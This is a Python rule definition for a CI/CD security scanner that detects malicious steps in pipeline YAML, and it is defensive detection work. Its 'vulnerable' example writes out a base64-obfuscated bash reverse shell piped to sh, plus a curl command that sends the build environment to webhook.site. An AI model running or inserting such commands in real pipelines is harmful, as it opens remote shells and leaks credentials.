"""BB-025, pipeline contains evidence of malicious activity."""
from __future__ import annotations

from ..._malicious import find_malicious_patterns, summarize_malicious_hits
from ..._primitives.blob_rule import yaml_blob_check
from ...base import Severity
from ...rule import Rule

RULE = Rule(
    id="BB-025",
    title="Pipeline contains indicators of malicious activity",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-7"),
    esf=("ESF-D-INJECTION", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-506", "CWE-913"),
    recommendation=(
        "Treat as a potential compromise. Identify the PR that added "
        "the matching step(s), rotate any credentials referenced from "
        "the pipeline's variable groups, and audit recent builds."
    ),
    docs_note=(
        "Specific indicators only (reverse shells, base64-decoded "
        "execution, miner binaries, Discord/Telegram webhooks, "
        "credential-dump pipes, audit-erasure commands). Does not "
        "replace BB-014 (TLS bypass) or BB-013 (Docker insecure), "
        "those are hygiene; this is evidence."
    ),
    known_fp=(
        "Security-training repositories, CTF challenges, and red-team "
        "exercise pipelines legitimately contain reverse-shell strings "
        "or exfil domains as literals. Matches inside YAML keys / HCL "
        "attributes whose names contain ``example``, ``fixture``, "
        "``sample``, ``demo``, or ``test`` are auto-suppressed; bare "
        "lines in a production pipeline still fire.",
        "Defaults to LOW confidence. Filter with ``--min-confidence "
        "MEDIUM`` to ignore all matches; the rule still surfaces the "
        "hit for teams that want to spot-check.",
    ),
    exploit_example=(
        "# Vulnerable: a step body executes a base64-decoded\n"
        "# payload, exfils to a third-party webhook, or runs a\n"
        "# known miner binary. A malicious PR (or a compromised\n"
        "# maintainer) lands the payload in the pipeline file;\n"
        "# every subsequent build executes it.\n"
        "pipelines:\n"
        "  default:\n"
        "    - step:\n"
        "        script:\n"
        "          - echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
        "          - curl https://webhook.site/abc?env=$(env|base64)\n"
        "\n"
        "# Safe: the pipeline does only what the pipeline does.\n"
        "# No obfuscated execution, no exfil POSTs, no\n"
        "# base64 -d | sh pipelines. If a check fires it's a\n"
        "# compromise or a CTF fixture; treat as incident response.\n"
        "pipelines:\n"
        "  default:\n"
        "    - step:\n"
        "        script:\n"
        "          - make build"
    ),
)


check = yaml_blob_check(
    RULE,
    scanner=find_malicious_patterns,
    pass_desc="No indicators of malicious activity detected.",
    fail_desc=summarize_malicious_hits,
    pass_recommendation="No action required.",
)
